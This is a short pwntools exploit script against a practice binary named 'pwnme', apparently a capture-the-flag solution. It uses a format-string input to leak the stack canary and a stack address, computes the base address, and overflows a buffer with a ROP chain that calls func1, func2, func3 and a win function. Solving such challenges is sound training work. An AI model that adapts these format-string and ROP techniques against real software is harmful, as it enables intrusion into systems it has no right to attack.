#!/usr/bin/env python3
from pwn import *


exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'



def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())

#### Exploit starts here ####

io = start()

io.sendline(b'%19$p %3$p')
leaks = io.recv().strip().split(b'?',1)[1]
leaks = leaks.split()
print(leaks)
canary = leaks[0]
stack_addr = leaks[1]

canary = int(canary,16)
stack_addr = int(stack_addr,16)
base_addr = stack_addr - 0x13b5

success(f"leaked canary {hex(canary)}")
success(f"Leaked stack addr {hex(stack_addr)}")
success(f"Base addr {hex(base_addr)}")

win = base_addr + 0x1343

elf.address = base_addr
rop = ROP(elf)
payload = b'A' * 24
payload += p32(canary)
payload += b"A" * 12

# Rop chain:
rop.func1(0x1337)
rop.func2(0xcafef00d)
rop.func3(0xd00df00d)
rop.win()
payload += rop.chain()
io.sendline(payload)

io.interactive()
